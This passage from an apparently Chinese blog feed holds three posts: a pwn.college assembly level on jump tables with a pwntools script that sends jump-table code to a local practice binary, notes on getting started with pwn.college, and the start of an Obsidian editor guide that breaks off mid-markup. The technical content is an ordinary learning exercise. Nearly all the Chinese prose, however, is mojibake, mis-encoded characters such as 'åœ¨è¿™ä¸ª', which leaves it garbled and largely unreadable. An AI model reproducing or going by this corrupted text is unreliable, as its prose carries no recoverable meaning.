class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨æ§åˆ¶æµæ“ä½œã€‚è¿™æ¶‰åŠä½¿ç”¨æŒ‡ä»¤ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ç‰¹æ®Šå¯„å­˜å™¨ <span class="hljs-string">`rip`</span>ï¼Œå³æŒ‡ä»¤æŒ‡é’ˆã€‚ä½ å°†ä½¿ç”¨ <span class="hljs-keyword">jmp</span>ã€<span class="hljs-keyword">call</span>ã€<span class="hljs-keyword">cmp</span> ç­‰æŒ‡ä»¤åŠå…¶æ›¿ä»£æŒ‡ä»¤æ¥å®ç°æ‰€éœ€çš„è¡Œä¸ºã€‚<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œæˆ‘ä»¬å°†å¤šæ¬¡ä½¿ç”¨åŠ¨æ€å€¼æµ‹è¯•ä½ çš„ä»£ç ï¼è¿™æ„å‘³ç€æˆ‘ä»¬å°†ä»¥å„ç§éšæœºæ–¹å¼è¿è¡Œä½ çš„ä»£ç ï¼Œä»¥éªŒè¯é€»è¾‘æ˜¯å¦è¶³å¤Ÿå¼ºå¤§ï¼Œèƒ½å¤Ÿåœ¨æ­£å¸¸ä½¿ç”¨ä¸­ç”Ÿå­˜ã€‚<br><br>æœ€åä¸€ç§è·³è½¬ç±»å‹æ˜¯é—´æ¥è·³è½¬ï¼Œé€šå¸¸åœ¨å®é™…ä¸­ç”¨äº switch è¯­å¥ã€‚<br><br>switch è¯­å¥æ˜¯ if è¯­å¥çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œå®ƒä»…ä½¿ç”¨æ•°å­—æ¥ç¡®å®šæ§åˆ¶æµçš„èµ°å‘ã€‚<br><br>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š<br>  switch(number):<br>    <span class="hljs-number">0</span>: <span class="hljs-keyword">jmp</span> do_thing_0<br>    <span class="hljs-number">1</span>: <span class="hljs-keyword">jmp</span> do_thing_1<br>    <span class="hljs-number">2</span>: <span class="hljs-keyword">jmp</span> do_thing_2<br><span class="hljs-symbol">    default:</span> <span class="hljs-keyword">jmp</span> do_default_thing<br><br>è¿™ä¸ªç¤ºä¾‹ä¸­çš„ switch æ˜¯åŸºäº <span class="hljs-string">`number`</span> è¿›è¡Œæ“ä½œï¼Œå®ƒå¯ä»¥æ˜¯ <span class="hljs-number">0</span>ã€<span class="hljs-number">1</span> æˆ– <span class="hljs-number">2</span>ã€‚<br><br>å¦‚æœ <span class="hljs-string">`number`</span> ä¸æ˜¯è¿™äº›æ•°å­—ä¹‹ä¸€ï¼Œåˆ™ä¼šè§¦å‘ <span class="hljs-meta">default</span>ã€‚<br><br>ä½ å¯ä»¥å°†å…¶è§†ä¸ºç®€åŒ–çš„ else-if ç»“æ„ã€‚<br><br>åœ¨ x86 ä¸­ï¼Œä½ å·²ç»ä¹ æƒ¯äº†ä½¿ç”¨æ•°å­—ï¼Œæ‰€ä»¥åº”è¯¥ä¸ä¼šæ„Ÿåˆ°å¥‡æ€ªï¼Œä½ å¯ä»¥åŸºäºæŸä¸ªç¡®åˆ‡çš„æ•°å­—æ¥åˆ›å»º if è¯­å¥ã€‚<br><br>æ­¤å¤–ï¼Œå¦‚æœä½ çŸ¥é“æ•°å­—çš„èŒƒå›´ï¼Œswitch è¯­å¥éå¸¸é€‚ç”¨ã€‚<br><br>ä¾‹å¦‚ï¼Œè€ƒè™‘åˆ°è·³è½¬è¡¨çš„å­˜åœ¨ã€‚<br><br>è·³è½¬è¡¨æ˜¯ä¸€æ®µè¿ç»­çš„å†…å­˜ï¼Œå…¶ä¸­ä¿å­˜ç€è¦è·³è½¬åˆ°çš„ä½ç½®çš„åœ°å€ã€‚<br><br>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œè·³è½¬è¡¨å¯ä»¥æ˜¯è¿™æ ·çš„ï¼š<br>  [<span class="hljs-number">0x1337</span>] = do_thing_0 çš„åœ°å€<br>  [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x8</span>] = do_thing_1 çš„åœ°å€<br>  [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x10</span>] = do_thing_2 çš„åœ°å€<br>  [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x18</span>] = do_default_thing çš„åœ°å€<br><br>ä½¿ç”¨è·³è½¬è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥å¤§å¤§å‡å°‘ä½¿ç”¨ <span class="hljs-keyword">cmp</span> æŒ‡ä»¤çš„æ¬¡æ•°ã€‚<br><br>ç°åœ¨æˆ‘ä»¬åªéœ€è¦æ£€æŸ¥ <span class="hljs-string">`number`</span> æ˜¯å¦å¤§äº <span class="hljs-number">2</span>ã€‚<br><br>å¦‚æœæ˜¯ï¼Œæ€»æ˜¯æ‰§è¡Œï¼š<br>  <span class="hljs-keyword">jmp</span> [<span class="hljs-number">0x1337</span>+<span class="hljs-number">0x18</span>]<br>å¦åˆ™ï¼š<br>  <span class="hljs-keyword">jmp</span> [jump_table_address + number * <span class="hljs-number">8</span>]<br><br>åˆ©ç”¨ä¸Šè¿°çŸ¥è¯†ï¼Œå®ç°ä»¥ä¸‹é€»è¾‘ï¼š<br>  å¦‚æœ <span class="hljs-built_in">rdi</span> æ˜¯ <span class="hljs-number">0</span>ï¼š<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x403006</span><br>  å¦åˆ™å¦‚æœ <span class="hljs-built_in">rdi</span> æ˜¯ <span class="hljs-number">1</span>ï¼š<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x4030ef</span><br>  å¦åˆ™å¦‚æœ <span class="hljs-built_in">rdi</span> æ˜¯ <span class="hljs-number">2</span>ï¼š<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x4031c8</span><br>  å¦åˆ™å¦‚æœ <span class="hljs-built_in">rdi</span> æ˜¯ <span class="hljs-number">3</span>ï¼š<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x4032ac</span><br>  å¦åˆ™ï¼š<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x403367</span><br><br>è¯·æŒ‰ç…§ä»¥ä¸‹çº¦æŸæ¡ä»¶å®Œæˆä¸Šè¿°ä»»åŠ¡ï¼š<br>  å‡è®¾ <span class="hljs-built_in">rdi</span> ä¸ä¼šä¸ºè´Ÿæ•°<br>  æœ€å¤šä½¿ç”¨ <span class="hljs-number">1</span> æ¡ <span class="hljs-keyword">cmp</span> æŒ‡ä»¤<br>  æœ€å¤šä½¿ç”¨ <span class="hljs-number">3</span> æ¡è·³è½¬æŒ‡ä»¤ï¼ˆä»»æ„å˜ä½“ï¼‰<br>  æˆ‘ä»¬ä¼šåœ¨ <span class="hljs-built_in">rdi</span> ä¸­æä¾›è¦è¿›è¡Œ <span class="hljs-string">&#x27;switch&#x27;</span> çš„æ•°å­—<br>  æˆ‘ä»¬ä¼šåœ¨ <span class="hljs-built_in">rsi</span> ä¸­æä¾›è·³è½¬è¡¨çš„åŸºåœ°å€<br><br>è¿™é‡Œæ˜¯ä¸€ä¸ªç¤ºä¾‹è¡¨æ ¼ï¼š<br>  [<span class="hljs-number">0x404222</span>] = <span class="hljs-number">0x403006</span>ï¼ˆåœ°å€å°†ä¼šæ”¹å˜ï¼‰<br>  [<span class="hljs-number">0x40422a</span>] = <span class="hljs-number">0x4030ef</span><br>  [<span class="hljs-number">0x404232</span>] = <span class="hljs-number">0x4031c8</span><br>  [<span class="hljs-number">0x40423a</span>] = <span class="hljs-number">0x4032ac</span><br>  [<span class="hljs-number">0x404242</span>] = <span class="hljs-number">0x403367</span><br></code></pre></td></tr></table></figure><ul><li>è·³è½¬è¡¨çš„åŸºåœ°å€åœ¨rsiä¸­</li><li>åç§»å­˜åœ¨rdiä¸­</li><li><code>[rsi + rdi*8]</code>å°±æ˜¯è¦è·³è½¬çš„åœ°å€</li><li>æœ€åä¸€ç§æƒ…å†µï¼šrsiåç§»0x20ï¼ˆä¹Ÿå°±æ˜¯4ä¸ª8å­—èŠ‚ï¼‰çš„ä½ç½®ã€‚æ³¨æ„ä¸æ˜¯ç»å¯¹åœ°å€</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    cmp rdi, 4        </span><br><span class="hljs-string">    jge default_case                               </span><br><span class="hljs-string">    lea rax, [rsi + rdi*8] </span><br><span class="hljs-string">    jmp [rax]    </span><br><span class="hljs-string">default_case:</span><br><span class="hljs-string">    mov rax,rsi</span><br><span class="hljs-string">    add rax,0x20</span><br><span class="hljs-string">    jmp [rax]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn college åˆ·é¢˜è®°å½•ï¼šGetting Started</title>
    <link href="/p/f99ac2b6/"/>
    <url>/p/f99ac2b6/</url>
    
    <content type="html"><![CDATA[<p>è®²è¿°äº†å¦‚ä½•ä½¿ç”¨èƒ–çƒ¤äº†é¸¡è¿™ä¸ªå¹³å°</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul><li>å±äºæ˜¯ç†Ÿæ‚‰ç¯å¢ƒçš„ä¸€èŠ‚</li><li>èƒ–çƒ¤äº†é¸¡ç‰¹æœ‰çš„äº¤äº’<ul><li>vscode</li><li>è™šæ‹Ÿæœº</li></ul></li><li>å‰ªåˆ‡æ¿å¦‚ä½•ä½¿ç”¨</li><li>ä¸ªäººçš„å®¶ç›®å½•æ˜¯å›ºå®šçš„</li></ul><h1 id="using-vscode-work-space"><a href="#using-vscode-work-space" class="headerlink" title="using vscode work space"></a>using vscode work space</h1><p>æè¿°äº†å¦‚ä½•ä½¿ç”¨Visual Studio Code å·¥ä½œåŒº</p><ul><li>ç‚¹å‡»startï¼Œè¿™æ ·å°±ä¼šå¯åŠ¨æŒ‘æˆ˜</li><li>ç‚¹å‡»ç½‘ç«™æœ€ä¸Šæ–¹çš„workspaceï¼Œå°†ä¼šå¯åŠ¨ä¸€ä¸ªç½‘é¡µç‰ˆvscode</li><li>ç½‘é¡µç‰ˆvscå¯ä»¥ä½¿ç”¨ctrl+shift+cå¤åˆ¶</li></ul><h1 id="using-the-desktop-gui"><a href="#using-the-desktop-gui" class="headerlink" title="using the desktop gui"></a>using the desktop gui</h1><ul><li>ç‚¹å‡»start</li><li>ä¹‹åç‚¹å‡»ä¸Šæ–¹çš„desktopï¼Œå¯åŠ¨è¿œç¨‹è™šæ‹Ÿæœº</li></ul><p>è¿™åœ°æ–¹æ¯”è¾ƒsbçš„æ˜¯ä»ç½‘é¡µç‰ˆè™šæ‹Ÿæœºä¸­å¤åˆ¶ä¸œè¥¿ã€‚ä½ åœ¨è™šæ‹Ÿæœºå¤åˆ¶ä¹‹åï¼Œå·¦ä¾§ä¼šæœ‰ä¸€ä¸ªå‰ªè´´æ¿ï¼Œå†å¤åˆ¶ä¸€æ¬¡æ‰èƒ½å°†å†…å®¹å¤åˆ¶åˆ°æœ¬æœºï¼Œè¿™é‡Œå®ƒç›¸å½“äºä¸€ä¸ªä¸­ä¸“ä½œç”¨</p><ol><li>Click on the ?? button on the left edge of the Desktop.</li><li>Click on the Clipboard button. The Dojoâ€™s clipboard will appear!</li><li>Overwrite the contents of the dojoâ€™s clipboard with the contents of your<br>systemâ€™s clipboard (for example, Ctrl-A followed by Ctrl-V).</li><li>Now the contents are in the dojoâ€™s clipboard!</li><li>Paste the contents into the terminal (Right Click-&gt;Paste).</li></ol><h1 id="pasting-into-desktop"><a href="#pasting-into-desktop" class="headerlink" title="pasting into desktop"></a>pasting into desktop</h1><p>åŒä¸Šï¼Œæ•™ä½ æ€ä¹ˆç”¨å‰ªè´´æ¿</p><h1 id="the-flag-file"><a href="#the-flag-file" class="headerlink" title="the flag file"></a>the flag file</h1><p>è®²è¿°äº†flag fileï¼šæ‚¨æ­£åœ¨ä»¥Â <code>hacker</code>Â ç”¨æˆ·èº«ä»½æ‰§è¡Œï¼Œè€ŒÂ <code>/flag</code>Â åªèƒ½ç”±Â <code>root</code>Â ç”¨æˆ·è¯»å–ï¼Œå› æ­¤æ‚¨æ— æ³•è®¿é—®å®ƒã€‚åœ¨ä¹‹å‰çš„æŒ‘æˆ˜ä¸­ï¼ŒæŒ‘æˆ˜ç¨‹åºæœ¬èº«ï¼ˆä¾‹å¦‚Â <code>/challenge/solve</code>Â ï¼‰ä»¥Â <code>root</code>Â ç”¨æˆ·èº«ä»½è¿è¡Œï¼ˆå› æ­¤å¯ä»¥è¯»å–æ ‡å¿—ï¼‰ï¼Œè¯»å–æ­¤æ–‡ä»¶å¹¶æ‰“å°å…¶å†…å®¹å†…å®¹</p><h1 id="using-practice-mode"><a href="#using-practice-mode" class="headerlink" title="using practice mode"></a>using practice mode</h1><p>Â <code>Practice</code>Â æ¨¡å¼ã€‚è¿™å°†æˆäºˆæ‚¨æŒ‘æˆ˜å®¹å™¨ä¸­çš„ç®¡ç†æƒé™ï¼ˆé€šè¿‡Â <code>sudo</code>Â ï¼‰ï¼Œä½¿æ‚¨èƒ½å¤Ÿæ›´å¼ºå¤§åœ°è°ƒè¯•è§£å†³æ–¹æ¡ˆå¹¶ä»¥å…¶ä»–æ–¹å¼å°è¯•æŒ‘æˆ˜ã€‚æ‚¨æ— æ³•ä½¿ç”¨å®ƒæ¥å®é™…è§£å†³æŒ‘æˆ˜ï¼Œå› ä¸ºåœ¨ç»ƒä¹ æ¨¡å¼ä¸‹ï¼ŒÂ <code>/flag</code>Â æ–‡ä»¶ä¼šè¢«æ›¿æ¢ä¸ºæ— æ³•å…‘æ¢ç§¯åˆ†çš„ç»ƒä¹ æ ‡å¿—ã€‚</p><p>å…ˆè¿›å»practiceï¼Œå¾—åˆ°secretã€‚ç„¶åè¿›å»startï¼ŒæŠŠsecretå‘ç»™ç»ˆç«¯å¾—åˆ°flag</p><h1 id="persistent-home-directories-one"><a href="#persistent-home-directories-one" class="headerlink" title="persistent home directories - one"></a>persistent home directories - one</h1><p>æ‚¨åœ¨é“åœºä¸­çš„ä¸»ç›®å½•åœ¨æŒ‘æˆ˜ä¹‹é—´ä¿æŒä¸å˜ã€‚è¿™æ„å‘³ç€å½“æ‚¨å¼€å§‹æ–°çš„æŒ‘æˆ˜æ—¶ï¼Œæ‚¨ä¿å­˜åœ¨å…¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶ä»ç„¶ä¼šåœ¨é‚£é‡Œã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒåœ¨æ¨¡å—ä¸­çš„å¤šä¸ªæŒ‘æˆ˜ä¸­å»ºç«‹ç¬”è®°ï¼Œå‚è€ƒæ—§çš„è§£å†³æ–¹æ¡ˆï¼Œæˆ–è€…é’ˆå¯¹éç»ƒä¹ æ¨¡å¼ä¸­çš„æŒ‘æˆ˜é‡æ–°è¿è¡Œåœ¨ç»ƒä¹ æ¨¡å¼ä¸­å®Œå–„çš„è§£å†³æ–¹æ¡ˆã€‚</p><p>è¿™ä¸ªæŒ‘æˆ˜å’Œä¸‹ä¸€ä¸ªæŒ‘æˆ˜å°†é€šè¿‡è®©æ‚¨åœ¨ä¸»ç›®å½•ä¸­å†™å…¥ä¸€ä¸ªæ–‡ä»¶æ¥é˜æ˜è¦ç‚¹ã€‚å‘èµ·æ­¤æŒ‘æˆ˜å¹¶æŒ‰ç…§å…¶è¯´æ˜è¿›è¡Œæ“ä½œï¼</p><h1 id="persistent-home-directories-two"><a href="#persistent-home-directories-two" class="headerlink" title="persistent home directories - two"></a>persistent home directories - two</h1><p>ç°åœ¨æ‚¨å·²ç»åœ¨ä¸»ç›®å½•ä¸­åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ¬æ¬¡æŒ‘æˆ˜å°†ä½¿ç”¨å®ƒï¼å‘èµ·æ­¤æŒ‘æˆ˜å¹¶æŒ‰ç…§å…¶è¯´æ˜è¿›è¡Œæ“ä½œï¼</p><p>Congratulations! The file that you created in the last challenge is still<br>present in your home directory! Please keep in mind that, though the contents<br>of /home/hacker persist, other areas (such as /tmp, /challenge, and so on) do<br>not.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>obsidianï¼šåœ°è¡¨æœ€å¼ºmarkdownç¼–è¾‘å™¨</title>
    <link href="/p/26528d5e/"/>
    <url>/p/26528d5e/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230913200440.png"></p><p>obsidianï¼Œä¹Ÿç§°é»‘æ›œçŸ³ï¼Œæ˜¯æœ€è¿‘é£å¤´æ— ä¸¤çš„ç¼–è¾‘å™¨ï¼Œå®ƒæœ‰ç€å¼ºå¤§çš„å¼€æºæ’ä»¶æ‹“å±•ï¼Œä»¥åŠåå‘ç´¢å¼•åŠŸèƒ½ï¼Œä»¥å¼€æºã€å…è´¹ã€æœ¬åœ°å­˜å‚¨ã€æ˜“ä¸Šæ‰‹çš„ç‰¹ç‚¹ï¼Œå¯¹å…¶ä½™markdownç¼–è¾‘å™¨è¿›è¡Œäº†é™ç»´æ‰“å‡»ï¼ˆæ¯”å¦‚æŸæ”¶è´¹ç¼–è¾‘å™¨ï¼‰</p><h1 id="åˆå§‹é…ç½®"><a href="#åˆå§‹é…ç½®" class="headerlink" title="åˆå§‹é…ç½®"></a>åˆå§‹é…ç½®</h1><p>ç•¥è¿‡ä¸‹è½½ã€å®‰è£…æ­¥éª¤</p><p>æ‰“å¼€obï¼Œä½ ä¼šå‘ç°å¦‚ä¸‹ç•Œé¢</p><p><img src="https://img.gls.show/img/20230912150124.png"></p><p>å¦‚æœç”¨æƒ¯äº†åˆ«çš„ç¼–è¾‘å™¨ï¼Œæˆ–è®¸å¯¹obã€ä»“åº“ï¼ˆvaultï¼‰ã€‘çš„æ¦‚å¿µæ„Ÿè§‰é™Œç”Ÿã€‚åŸæ¥ï¼Œobå°†å›ºå®šçš„æ–‡ä»¶å¤¹è§†ä¸ºä¸€ä¸ªä»“åº“ï¼Œä½ ä¹Ÿå¯ä»¥å°†å®ƒè§†ä½œä¸€ä¸ªå·¥ä½œç›®å½•ï¼Œæ¯ä¸€ä¸ªä»“åº“éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå‡è®¾ä½ åœ¨è¿™ä¸ªä»“åº“ä¸­å®‰è£…äº†ä¸€äº›æ’ä»¶ï¼Œé‚£ä¹ˆå¯¹åº”çš„é…ç½®å°±ä¼šå†™åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹çš„.obæ–‡ä»¶å¤¹ä¸­</p><p>å¦‚æœæ²¡æœ‰ä»»ä½•ä»“åº“ï¼Œç›´æ¥ç‚¹å‡»åˆ›å»ºå³å¯ã€‚å¦‚æœä»¥åŠæœ‰äº†æœ¬åœ°ä»“åº“ï¼Œç›´æ¥é€‰æ‹©å¹¶æ‰“å¼€å³å¯</p><h1 id="å¤–è§‚æ›´æ”¹"><a href="#å¤–è§‚æ›´æ”¹" class="headerlink" title="å¤–è§‚æ›´æ”¹"></a>å¤–è§‚æ›´æ”¹</h1><p>obé»˜è®¤çš„é¢œè‰²æ˜¯é»‘è‰²ï¼Œå¦‚æœä¸å–œæ¬¢è¿™ä¸ªé¢œè‰²ï¼Œå¯ä»¥åœ¨<code>è®¾ç½®-ã€‹å¤–è§‚-ã€‹åŸºç¡€é¢œè‰²</code>ä¸­è®¾ç½®ä¸ºç™½è‰²</p><p>æˆ–è€…ï¼Œå¯ä»¥ç‚¹å‡»<code>è®¾ç½®-ã€‹å¤–è§‚-ã€‹ä¸»é¢˜-ã€‹ç®¡ç†</code>ï¼Œä¸‹è½½ä¸»é¢˜å¹¶åº”ç”¨</p><p>æ­¤å¤–ï¼Œä½¿ç”¨æ’ä»¶ï¼ˆæ¯”å¦‚style settingï¼‰å¯ä»¥ä¸ªæ€§åŒ–é…ç½®ä»¥ä¸Šæ‰€ä¸‹è½½çš„obçš„ä¸»é¢˜ï¼Œæ¯”å¦‚è°ƒæ•´å­—ä½“å¤§å°ã€é¢œè‰²ç”šè‡³ç›´æ¥å¯¼å…¥cssæ–‡ä»¶ç­‰</p><p><img src="https://img.gls.show/img/20230810160851.png"></p><p><strong>å‡ ä¸ªæ¨èçš„ä¸»é¢˜ï¼š</strong></p><ul><li>shimmering</li><li>ITS</li><li>minimal</li><li>Blue Topaz(è“è‰²æ‰˜å¸•çŸ³ï¼‰</li></ul><h1 id="å­—ä½“æ›´æ”¹"><a href="#å­—ä½“æ›´æ”¹" class="headerlink" title="å­—ä½“æ›´æ”¹"></a>å­—ä½“æ›´æ”¹</h1><p>obæ”¯æŒæ›´æ¢è½¯ä»¶ç•Œé¢å’Œæ­£æ–‡ä¸­çš„å­—ä½“ï¼Œæ–¹å¼å¾ˆç®€å•</p><ul><li>å…ˆä¸‹è½½å­—ä½“</li><li>è®¾ç½®-ã€‹å­—ä½“æ›´æ”¹-ã€‹è¾“å…¥å­—ä½“åç§°-ã€‹ä¿å­˜</li></ul><p><a href="https://coffeetea.top/zh/best-practices/obsidian-font-LXGW.html">obsidianæ›´æ¢å­—ä½“ | obsidianæ–‡æ¡£å’–å•¡è±†ç‰ˆ</a></p><h1 id="æ’ä»¶"><a href="#æ’ä»¶" class="headerlink" title="æ’ä»¶"></a>æ’ä»¶</h1><p>obæœ€å¸å¼•äººçš„æˆ–è®¸å°±æ˜¯å®ƒçš„æ’ä»¶åŠŸèƒ½ã€‚ç‚¹å‡»å·¦ä¸‹è§’çš„é½¿è½®ï¼Œè¿›å…¥è®¾ç½®ç•Œé¢ï¼Œç‚¹å‡»å·¦ä¾§ã€ç¬¬ä¸‰æ–¹æ’ä»¶ã€‘ï¼Œå…³é—­ã€å®‰å…¨æ¨¡å¼ã€‘ï¼Œå³å¯è¿›å…¥æ’ä»¶å¸‚åœºå®‰è£…æ’ä»¶ã€‚å®‰è£…ä¹‹åï¼Œè¿˜éœ€è¦ç‚¹å‡»ã€æ¿€æ´»ã€‘æ–¹å¯ä½¿ç”¨æ’ä»¶</p><p>ä»¥outlineæ’ä»¶ä¸ºä¾‹ï¼Œå®ƒçš„ä½¿ç”¨ã€æ¿€æ´»æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>You can activate this plugin within Obsidian by doing the following:</p><ul><li>Open Settings &gt; Third-party plugin</li><li>Make sure Safe mode is off</li><li>Click Browse community plugins</li><li>Search for â€œOutlinerâ€</li><li>Click Install</li><li>Once installed, close the community plugins window and activate the newly installed plugin</li></ul><p>ä¸‹é¢æ˜¯ä¸€äº›æ¨èçš„æ’ä»¶ï¼š</p><ul><li>link title <ul><li>ç²˜è´´é“¾æ¥çš„æ—¶å€™ä¼šè‡ªåŠ¨ç”Ÿæˆè¯¥è¿æ¥çš„æ‘˜è¦å¹¶ç”Ÿæˆè¶…é“¾æ¥</li></ul></li><li>advance tables<ul><li>æå‡obçš„è¡¨æ ¼ç¼–è¾‘ä½“éªŒ</li></ul></li><li>advanced slides<ul><li>ä½¿ç”¨mdåˆ¶ä½œslides</li></ul></li><li>style setting<ul><li>æ”¯æŒå¯¹ä¸»é¢˜è¿›è¡Œè°ƒæ•´</li></ul></li><li>calendar<ul><li>æ–¹ä¾¿åˆ›å»ºæ¯æ—¥è®°å½•ï¼Œå¹¶æä¾›æ—¥å†çœ‹æ¿</li></ul></li><li>image toolkit<ul><li>æå‡obçš„çœ‹å›¾ä½“éªŒ</li></ul></li></ul><h1 id="ä½¿ç”¨æŠ€å·§"><a href="#ä½¿ç”¨æŠ€å·§" class="headerlink" title="ä½¿ç”¨æŠ€å·§"></a>ä½¿ç”¨æŠ€å·§</h1><h2 id="é“¾æ¥è®¾ç½®"><a href="#é“¾æ¥è®¾ç½®" class="headerlink" title="é“¾æ¥è®¾ç½®"></a>é“¾æ¥è®¾ç½®</h2><p>obsidiané»˜è®¤çš„å›¾ç‰‡é“¾æ¥æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">!<span class="hljs-string">[[Pasted image 20231106215146.png]]</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œmarkdownçš„å›¾ç‰‡é“¾æ¥ä¸€èˆ¬æ˜¯è¿™ç§æ ¼å¼ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less">!<span class="hljs-selector-attr">[]</span>(url)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœä½ ä½¿ç”¨åˆ«çš„mdç¼–è¾‘å™¨(æ¯”å¦‚typora)æ‰“å¼€çš„è¯ï¼Œè¿™äº›å›¾ç‰‡å°±æ— æ³•æ­£å¸¸æ˜¾ç¤º</p><p>æ­¤å¤–ï¼Œobé»˜è®¤æ˜¯æ”¯æŒåŒé“¾çš„ ï¼Œå¦‚æœä¸å–œæ¬¢éœ€è¦åœ¨è®¾ç½®ä¸­å…³æ‰</p><p>é€‰é¡¹</p><h1 id="å¿«æ·é”®"><a href="#å¿«æ·é”®" class="headerlink" title="å¿«æ·é”®"></a>å¿«æ·é”®</h1><p>è®¾ç½®-ã€‹é€‰é¡¹-ã€‹å¿«æ·é”®å¯ä»¥æ‰‹åŠ¨è®¾ç½®å¿«æ·é”®ï¼Œæˆ‘å¸¸ç”¨çš„å¿«æ·é”®ï¼š</p><ul><li>å°†è®¾ç½®æ— åºåˆ—è¡¨æ˜ å°„åˆ°å¿«æ·é”®<code>c+l</code></li><li>æœ‰åºåˆ—è¡¨æ˜ å°„åˆ°å¿«æ·é”®<code>alt+l</code></li><li><code>c+-</code> å°†ç•Œé¢å­—ä½“å˜å°</li><li><code>c++</code> å°†ç•Œé¢å­—ä½“å˜å¤§</li><li><code>c+a+l</code> å¯ä»¥åˆ›å»ºå¾…åŠäº‹é¡¹</li><li><code>c+s+l</code>é”å®šå½“å‰ç¬”è®°</li></ul><h1 id="å¤šå¹³å°åŒæ­¥"><a href="#å¤šå¹³å°åŒæ­¥" class="headerlink" 